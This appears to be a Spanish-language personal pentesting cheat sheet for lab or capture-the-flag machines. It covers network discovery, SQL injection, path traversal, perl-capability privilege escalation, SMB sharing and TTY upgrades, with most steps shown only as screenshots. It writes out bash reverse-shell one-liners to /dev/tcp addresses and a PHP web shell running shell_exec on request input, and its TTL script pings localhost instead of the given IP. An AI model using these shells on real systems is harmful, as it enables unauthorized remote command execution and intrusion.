## Conocer el sistema operativo con el TTL de un PING

![[Pasted image 20221217111831.png]]
Aunque para hacer esto mismo también podríamos programar una herramienta en bash que en función del TTL nos evalúe si es un Windows o Linux:
```bash
#!/bin/bash

# Obtenemos la dirección IP del host
echo -n "Introduce la dirección IP: "
read IP

# Realizamos un ping al host y verificamos si el host es accesible
if ping -c 1 $IP > /dev/null 2>&1; then

# Obtenemos el valor del TTL
TTL=$(ping -c 1 localhost | grep "ttl=" | awk '{print $7}' | tr -d "ttl=")

echo $TTL

# Analizamos el valor del TTL para determinar el sistema operativo
if [ $TTL -gt 60 ] && [ $TTL -lt 100 ]; then
  echo "El sistema operativo es Linux/Unix"
elif [ $TTL -gt 100 ] && [ $TTL -lt 170 ]; then
  echo "El sistema operativo es Windows"
else
  echo "No se puede determinar el sistema operativo con certeza"
fi

else
  echo "El host no es accesible"
fi

```
Y si le facilitamos la IP de la máquina objetivo, nos lo muestra:
![[Pasted image 20230211001435.png]]
## DETECTAR EQUIPOS CONECTADOS A MI RED CON ARP-SCAN
Para ello tenemos que ejecutar el siguiente comando pasándole la interfaz de red que estemos utilizando:
![[Pasted image 20221230095219.png]]
Y por ejemplo si la interfaz de red es otra, la tendremos que seleccionar (como en este caso que estoy utilizando un portátil):
![[Pasted image 20221230095402.png]]
## DETECTAR EQUIPOS CONECTADOS A MI RED CON NETDISCOVER
También podemos hacer esto mismo pero con netdiscover:
```bash
netdiscover -i eth0 -r 192.168.0.0/24
```
![[Pasted image 20230726112842.png]]
## DETECTAR PUERTOS ABIERTOS DE TODOS LOS HOSTS DENTRO DE MI RED CON MASSCAN
Podemos utilizar esta herramienta de la siguiente forma y me detecta todos los puertos 445 de todos los equipos conectados a mi rando de red:
![[Pasted image 20230414125831.png]]
También podemos hacerlo como /16 por si queremos ampliar la búsqueda de más equipos que se encuentren en otros rangos de la red, por ejemplo si hay un host que sea 192.168.0.20.44:
![[Pasted image 20230414125924.png]]

## COMPARTIR ARCHIVOS POR SERVIDOR WEB DE PYTHON

Para ello nos ubicamos dentro del directorio que queramos compartir y ejecutamos lo siguiente:

![[Pasted image 20221217112301.png]]

Ahora si hacemos un localhost o introducimos la IP que nos dicen, aparecerá lo siguiente:

![[Pasted image 20221217112310.png]]

## ACCEDER A ETC/PASSWD CON PATH TRAVERSAL

Para ello iremos a la siguiente ruta:

![[Pasted image 20221217112323.png]]

## CONSEGUIR REVERSE SHELL DE MÁQUINA VÍCTIMA A NUESTRO EQUIPO

Para ello primero pondremos a escuchar con netcat desde nuestro equipo host:
![[Pasted image 20221217112335.png]]
Después, desde la máquina víctima necesitaremos que ejecute el siguiente código para enviarnos una bash:
```bash
bash -i >& /dev/tcp/10.10.16.27/443 0>&1
```
Aunque si lo hacemos desde un navegador, debemos escribirlo de esta manera, porque al poner bash -c seleccionamos el intérprete:
```bash
bash -c 'bash -i >& /dev/tcp/10.8.100.91/443 0>&1'
````
## Código PHP malicioso para ganar Reverse Shell

Esto se utiliza para subir este fichero php a una web que funcione con este lenguaje para después acceder a dicho documento desde algún directorio de uploads de la web; y así ganar ejecución remota de comandos:

```python
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

![[Pasted image 20221218213646.png]]
Luego podemos acceder a este fichero malicioso desde la máquina víctima poniendo lo siguiente en la URL seguido del comando a ejecutar:
![[Pasted image 20230218112346.png]]

## TCPDUMP PARA INTERCEPTAR PAQUETES DENTRO DE LA CONEXIÓN

![[Pasted image 20221217112455.png]]
También podemos guardar con tcpdump las conexiones por una determinada interfaz y analizarlas con wireshark. Por ejemplo hacemos un escaneo:
![[Pasted image 20230412194342.png]]
Si guardamos esto en un fichero .cap para analizarlo con wireshark, veremos que en este escaneo además de nuestra IP también se habrá enviado otros paquetes desde la IP 192.168.0.232 que hemos proporcionado como señuelo:
![[Pasted image 20230412194600.png]]
![[Pasted image 20230412194623.png]]

## MODIFICAR EL FICHERO /ETC/HOSTS PARA AÑADIR UN DOMINIO QUE NO NOS FUNCIONA

Podemos tener una URL que no nos carga en el navegador:

![[Pasted image 20221217112601.png]]

Entonces ahora tenemos que indicar que la IP apunte a este subdominio, tal y como hicimos antes:

![[Pasted image 20221217112608.png]]

Entonces ahora si pegamos la dirección que se nos indica en la web, accederemos a un menú de registro:

![[Pasted image 20221217112615.png]]

## PROBAR MUCHAS URLS PARECIDAS CON PYTHON

Crearemos un script como este:

![[Pasted image 20221217112625.png]]

Y tras ejecutarlo, se pone a hacer peticiones a muchas URLS donde la única diferencia es que cambia un carácter, y nos va mostrando aquellas urls cuya respuesta sea diferente a las habituales, por ejemplo una extensión superior a 82:

![[Pasted image 20221217112634.png]]

## **HERRAMIENTA SEARCHSPLOIT**

Podemos buscar exploit de alguna vulnerabilidad, por ejemplo de una versión ftp:

![[Pasted image 20221217112646.png]]

Vamos a descargarnos el primer exploit desde esta herramienta utilizando la opción -m:

![[Pasted image 20221217112653.png]]

## **OBTENER TABLAS, COLUMNAS Y REGISTROS DE BASES DE DATOS CON SQL INJECTION**

### CONOCER LA BASE DE DATOS ACTUAL:

![[Pasted image 20221217114226.png]]

Y ya lo tenemos:

![[Pasted image 20221217114233.png]]

### BUSCAR OTRAS BASES DE DATOS ADEMÁS DE LA ACTUAL

![[Pasted image 20221217114240.png]]

Y se nos muestran otras bases de datos:

![[Pasted image 20221217114247.png]]

### CONOCER TABLAS DE UNA BASE DE DATOS

![[Pasted image 20221217114255.png]]

Y una vez hecho esto podemos ver como la tabla se llama registration:

![[Pasted image 20221217114301.png]]

### CONOCER LAS COLUMNAS DE UNA BASE DE DATOS

![[Pasted image 20221217114309.png]]

Y este es el resultado:

![[Pasted image 20221217114315.png]]

### CONOCER LOS REGISTROS DE UNA BASE DE DATOS

![[Pasted image 20221217114322.png]]

Y nos sale esta información, la cual vamos a guardar por si acaso:

![[Pasted image 20221217114333.png]]

# **ESCALADA DE PRIVILEGIOS**

## **ESCALADA CON USR/BIN/PERL SETUID:**

Ahora vamos a escalar privilegios, para ello vamos a ejecutar el comando getcap -r /2>/dev/null, donde debemos fijarnos en la segunda fila porque dice que perl puede ejecutar cosas con plenos poderes:

![[Pasted image 20221217114539.png]]

También podemos comprobar que podemos ejecutar código como root desde perl con el comando ls -la

![[Pasted image 20221217114548.png]]

Ahora debemos crear un script en perl que nos sirve para elevar los privilegios, el cual será este:

![[Pasted image 20221217114555.png]]

Para ejecutarlo lo hacemos con echo -ne:

![[Pasted image 20221217114602.png]]

Y ahora ya somos root:

![[Pasted image 20221217114609.png]]

También podemos hacerlo de otra forma, yendo a gtfobins y miramos el payload para explotar las capabilities de perl, y tenemos esto:
![[Pasted image 20230720132042.png]]
Y ya somos root al ejecutarlo de cualquiera de las dos formas:
![[Pasted image 20230720132148.png]]
## COMPARTIR ARCHIVOS CON WINDOWS CON IMPACKET-SMBSERVER | RECURSO COMPARTIDO

Si quiero compartir los archivos de un directorio en un recurso compartido en Windows, debo ubicarme en la carpeta donde los quiera compartir y ejecutar este comando:

![[Pasted image 20221217114627.png]]

Ahora desde la máquina víctima Windows nos descargamos el archivo del recurso compartido, poniendo primero la IP de la máquina Kali que está compartiendo el recurso, luego el nombre del archivo compartido y por último el nombre que le queramos poner:

![[Pasted image 20221217114634.png]]
[[MAQUINA GRANDPA (Buffer Overflow IIS 6.0, escalada con seimpersonateprivilege y exploit churrasco)]]

# **COMPARTIR ARCHIVOS RECURSO COMPARTIDO CUANDO NOS DA UN ERROR DE CREDENCIALES**

Vamos a compartir estos dos archivos creando un recurso compartido con impacket-smbserver de esta forma:

![[Pasted image 20221217114648.png]]

Pero al descargar los archivos de la máquina víctima nos dice que debe haber un usuario y contraseña de por medio:

![[Pasted image 20221217114654.png]]

Por tanto vamos a crear otra vez el recurso compartido pero fijando un usuario y contraseña:

![[Pasted image 20221217114701.png]]

Ahora descargamos todo el recurso compartido de esta forma:

![[Pasted image 20221217114707.png]]

Ahora si hacemos un dir de x (que es la unidad que hemos creado y donde se almacena todo el recurso compartido), accedemos a todos los archivos:

![[Pasted image 20221217114715.png]]

# EJECUTAR NETCAT EN WINDOWS

Para ejecutar netcat en windows debemos tener el ejecutable de netcat descargado y ejecutamos el siguiente comando:

![[Pasted image 20221217114732.png]]

Puede darse el caso donde tengamos que poner primero un ./ antes de ejecutar netcat:

![[Pasted image 20221217114739.png]]

Aunque también puede darse el caso de que tengamos que poner un ./ antes del ejecutable para ejecutarlo:

## **CONEXIÓN POR TELNET**

Para conectarse por Telnet, en el equipo servidor debe tener configurado correctamente este servicio, una vez lo tenga configurado, ya podemos iniciar sesión utilizando el nombre del login de dicho equipo de destino y su contraseña de iniciar sesión, escribiendo telnet <dirección IP>:

## TRATAMIENTO DE LA TTY

Para crearnos una pseuso-consola donde podamos hacer control c y no tengamos problemas con el teclado ejecutamos lo siguiente:

- Ponemos script /dev/null -c bash
- Pulsamos control z
- Escribimos script /dev/null -c bash
- Después ponemos stty raw -echo; fg
- Ponemos xterm

![[Pasted image 20230502104304.png]]

- Ponemos export SHELL=bash
- Por último ponemos export TERM=xterm

![[Pasted image 20230502104222.png]]







